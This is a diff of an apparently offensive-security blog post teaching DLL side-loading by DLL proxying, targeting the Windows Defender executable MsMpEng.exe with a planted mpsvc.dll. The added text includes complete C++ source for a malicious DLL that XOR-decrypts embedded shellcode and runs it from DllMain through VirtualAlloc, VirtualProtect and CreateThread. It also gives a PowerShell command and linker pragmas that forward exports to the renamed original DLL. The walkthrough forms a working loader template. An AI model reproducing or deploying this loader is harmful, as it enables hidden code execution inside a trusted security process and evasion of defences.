@@ -7,15 +7,18 @@ published: false
 
 ## DLL Side-Loading
 
-I'm going to cover an example of how to perform a DLL side-load from start to finish using a C++ payload and a legitimate DLL commonly found on disk. 
+I'm going to cover an example of how to perform a DLL side-load from start to finish using a C++ payload and a legitimate DLL commonly found on disk. The specific technique covered is known as "**DLL proxying**" where we use the legitimate DLL along with a malicious DLL which exports all the functions that the legit DLL exports. <br >
 
-In this post, we'll walk through the following steps:
+
+**In this post, we'll walk through the following steps:**
+- What is DLL side-loading and DLL proxying
 - How to choose an EXE and DLL to side-load
-- How to create the malicous DLL
+- How to create the malicous DLL to run shellcode
 - How to find the exported functions needed to side-load the DLL
 - Putting everything together for a successful DLL side-load attack
 
 But first...
+
 
 ### What is DLL side-loading?
 
@@ -25,6 +28,18 @@ But rather than just planting the DLL within the search order of a program then 
 directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s)."_
 
 So we need to choose a legitimate EXE, find a DLL that it loads from disk, create a malicious DLL which runs shellcode, then copy or upload the EXE and DLL together to the same folder, and upon executing the EXE it should side-load the malicious DLL from within the same folder.
+
+
+### What is DLL proxying
+This specific technique of DLL hijacking is called DLL proxying which uses the following steps:
+1. EXE starts and calls `malicious.dll` in same folder
+2. `malicious.dll` calls legitimate `dll_orig.dll` in same folder by exporting all functions from the legitimate DLL
+3. Shellcode/payload runs in `malicious.dll` and also runs exported functions from `dll_orig.dll` 
+<br />
+The execution flow of DLL proxying looks like this ([source](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)):
+
+![image](https://user-images.githubusercontent.com/35749735/195198423-f5e76979-65ec-480b-a4c3-a2e032149e81.png)
+
 
 ### Choosing an EXE and DLL to side-load
 There are various methods we can use to find a legitimate EXE and DLL which it loads from disk. A public repository and great resource called [Hijack Libs](https://hijacklibs.net/) can easily be used to search for known EXEs and DLLs that could be used for DLL side-loading or DLL hijacking. We could use this application to filter on specific vendors of types of DLL hijacks such as side-loading.
@@ -47,16 +62,117 @@ Assuming Windows Defender is currently running on the system, we can then see th
 
 Also, the DLL **mpsvc.dll** is a known DLL side-load that can be found in Hijack Libs at this [URL](https://hijacklibs.net/entries/microsoft/built-in/mpsvc.html).
 
-A third option for finding your own DLL side-loads is to use the publicly available tool [Windows Feature Hunter (WFH)](https://github.com/ConsciousHacker/WFH) from [@ConsciousHacker](https://twitter.com/conscioushacker) which has its own documentation and method for finding vulnerable DLL side-loads on your own system. If you prefer to go the easy route, there is a CSV list within the GitHub repo of discovered EXEs and their DLL side-loads [found here](https://github.com/ConsciousHacker/WFH/blob/main/examples/) which has over 900 DLL side-loads you could abuse.
+A third option for finding your own DLL side-loads is to use the publicly available tool [Windows Feature Hunter (WFH)](https://github.com/ConsciousHacker/WFH) from [@ConsciousHacker](https://twitter.com/conscioushacker) which has its own documentation and method for finding vulnerable DLL side-loads on your own system. If you prefer to go the easy route, there is a CSV list within the GitHub repo of discovered EXEs and their DLL side-loads [found here](https://github.com/ConsciousHacker/WFH/blob/main/examples/) which has over 900 DLL side-loads you could abuse. Another blog has many more DLL hijacking examples [HERE](https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv).
+
 
 ### Creating a malicious DLL
 
-Once we've found our executable and DLL side-load to target, we can now start to create our malicous DLL. In this example, we're going to target the **MsMpEng.exe (Windows Defender)** process with the DLL side-load of **mpsvc.dll**.
+Once we've found our executable and DLL side-load to target, we can now start to create our malicous DLL which will execute shellcode. In this example, we're going to target the **MsMpEng.exe (Windows Defender)** process with the DLL side-load of **mpsvc.dll**.
 
+Start by creating a new C++ project in Visual Studio for a "Dyamic Library" or make a new TXT file in a text editor to manually write your DLL. Visual Studio will compile the C++ DLL for you, otherwise if you're using a text editor then you can compile it using the **cl.exe** command-line utility.
+
+We're going to create a relatively straightforward DLL which uses XOR decryption to decrypt shellcode and launch it via _CreateThread_. Upon execution, the shellcode will launch calc.exe as a proof-of-concept.
+
+Here is the template code for our DLL **mpsvc.dll** which executes shellcode to launch calc.exe:
+```
+#include "pch.h"
+#include <windows.h>
+
+// XOR function
+void XOR(char* data, size_t data_len, char* key, size_t key_len) {
+	int j;
+
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+// Calc.exe shellcode (exit function = thread)
+unsigned char payload[] = { 0xac,0x08,0xf0,0x97,0x87,0xd8,0xf0,0x30,0x72,0x64,0x60,0x01,0x01,0x23,0x21,0x26,0x66,0x78,0x01,0xa0,0x01,0x69,0xdb,0x12,0x13,0x3b,0xfc,0x62,0x28,0x78,0xf9,0x36,0x01,0x18,0xcb,0x01,0x23,0x3f,0x3f,0x87,0x7a,0x38,0x29,0x10,0x99,0x08,0x42,0xb3,0xdb,0x0c,0x51,0x4c,0x70,0x48,0x01,0x11,0x81,0xba,0x7e,0x36,0x31,0xf1,0xd2,0x9f,0x36,0x60,0x01,0x08,0xf8,0x21,0x57,0xbb,0x72,0x0c,0x3a,0x65,0xf1,0xdb,0xc0,0xfb,0x73,0x77,0x30,0x78,0xb5,0xb2,0x10,0x46,0x18,0x41,0xa3,0x23,0xfc,0x78,0x28,0x74,0xf9,0x24,0x01,0x19,0x41,0xa3,0x90,0x21,0x78,0xcf,0xf9,0x33,0xef,0x15,0xd8,0x08,0x72,0xa5,0x3a,0x01,0xf9,0x78,0x43,0xa4,0x8d,0x11,0x81,0xba,0x7e,0x36,0x31,0xf1,0x08,0x92,0x11,0xd0,0x1c,0x43,0x3f,0x57,0x7f,0x75,0x09,0xe1,0x07,0xbc,0x79,0x14,0xcb,0x33,0x57,0x3e,0x31,0xe0,0x56,0x33,0xef,0x2d,0x18,0x04,0xf8,0x33,0x6b,0x79,0x31,0xe0,0x33,0xef,0x25,0xd8,0x08,0x72,0xa3,0x36,0x68,0x71,0x68,0x2c,0x3d,0x7b,0x11,0x18,0x32,0x2a,0x36,0x6a,0x78,0xb3,0x9e,0x44,0x60,0x02,0xbf,0x93,0x2b,0x36,0x69,0x6a,0x78,0xf9,0x76,0xc8,0x07,0xbf,0x8c,0x8c,0x2a,0x78,0x8a,0x31,0x72,0x64,0x21,0x50,0x40,0x73,0x73,0x3f,0xbd,0xbd,0x31,0x73,0x64,0x21,0x11,0xfa,0x42,0xf8,0x18,0xb7,0xcf,0xe5,0xc9,0x84,0x3c,0x7a,0x4a,0x32,0xc9,0xd1,0xa5,0x8d,0xad,0x8d,0xb1,0x69,0xd3,0x84,0x5b,0x4f,0x71,0x4c,0x3a,0xb0,0x89,0x84,0x54,0x55,0xfb,0x34,0x60,0x05,0x5f,0x5a,0x30,0x2b,0x25,0xa8,0x8a,0xbf,0xa6,0x10,0x16,0x5c,0x53,0x1e,0x17,0x1c,0x44,0x50 };
+unsigned int payload_len = sizeof(payload);
+
+// Standard function to allocate memory, copy shellcode to it, and execute the thread
+extern __declspec(dllexport) int RunThis(void);
+int RunThis(void) {
+
+	void* exec_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD oldprotect = 0;
+
+	// Decryption key
+	char key[] = "P@ssw000rd!";
+
+	// Decrypt the shellcode
+	XOR((char*)payload, payload_len, key, sizeof(key));
+
+	// Allocate memory
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// Copy payload to the buffer
+	RtlMoveMemory(exec_mem, payload, payload_len);
+
+	// Make the buffer executable
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	// If all good, run the shellcode
+	if (rv != 0) {
+		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+		WaitForSingleObject(th, 0);
+	}
+	
+
+	return 0;
+}
+
+//Runs as the Main() function
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+
+	switch (fdwReason) {
+		//DLL_PROCESS_ATTACH will run when the DLL is loaded within a process
+	case DLL_PROCESS_ATTACH:
+		RunThis();
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+```
 
 ### Finding exported functions from the DLL
 
-Before we can finalize the malicious DLL, we will need to get a list of exported functions from the existing DLL on disk and add it to our side-loaded DLL. 
+Before we can finalize the malicious DLL, we will need to get a list of exported functions from the existing legitimate DLL on disk and add it to our malicious DLL. In order for the executable and legit DLL to run properly with our malicious DLL, we have to add the exported functions to the malicious DLL to forward these functions to the legitimate DLL.<br /><br />
+
+Now to get the exported functions from the legitimate DLL **mpsvc.dll** at its expected location ([detailed here](https://hijacklibs.net/entries/microsoft/built-in/mpsvc.html)), we can use this [PowerShell script](https://gist.github.com/wsummerhill/23c138be8f953155e20c01055d6cf53f#file-get-exports-ps1) with the following syntax:<br />
+```
+PS> . .\Get-DLL-Exports.ps1
+PS> Get-DLL-Exports -DllPath %PROGRAMDATA%\Microsoft\Windows Defender\Platform\%VERSION%\MpSvc.dll -ExportsToCpp C:\output\folder\MpSvc-exports.txt
+```
+
+After executing the PowerShell command, the output file **MpSvc-exports.txt** should have all the DLL exports in it as shown below:
+```
+// --> ADD ALL EXPORTS BELOW TO THE TOP OF YOUR .CPP APPLICATION <--
+#pragma once
+#pragma comment (linker, "/export:ServiceCrtMain=MpSvc_orig.ServiceCrtMain,@2")
+#pragma comment (linker, "/export:ValidateDrop=MpSvc_orig.ValidateDrop,@1")
+```
+
+We can see that **MpSvc.dll** only has 2 DLL exports which we will add to the top our C++ code now. A lot of DLLs will have MANY more exported functions, but in this case the DLL only has 2. <br />
+Once you add the exports to the DLL code, it should look something like this:
+
+![image](https://user-images.githubusercontent.com/35749735/195206599-cb7f19ac-33e8-4ed4-9bd9-74ad328535cd.png)
+
+Compile your malicious DLL in Visual Studio or using `cl.exe` to the output file named **mpsvc.dll**!
+
 
 ### Putting it all together
 
